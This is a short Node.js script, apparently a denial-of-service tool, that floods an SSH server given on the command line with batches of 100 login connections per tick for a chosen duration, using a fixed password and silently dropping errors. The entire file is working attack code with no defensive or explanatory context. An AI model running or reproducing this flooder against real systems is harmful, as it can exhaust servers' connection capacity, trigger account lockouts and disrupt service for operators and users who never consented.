const { Client } = require('ssh2');

const floodSSHServer = (hostname, port, username, duration) => {
    const startTime = Date.now();
    const interval = setInterval(() => {
        if (Date.now() - startTime > duration) {
            clearInterval(interval);
            return;
        }

        for (let i = 0; i < 100; i++) {
            const password = 'PermenMD_Here'
            const conn = new Client();

            conn.on('error', (err) => {
                conn.end();

            }).connect({
                host: hostname,
                port: port,
                username: username,
                password: password

            });

        }

    });
}
const host = process.argv[2];
const port = process.argv[3];
const user = process.argv[4];
const duration = process.argv[5] * 1000;

console.log(`${duration}`)
floodSSHServer(host, port, user, duration)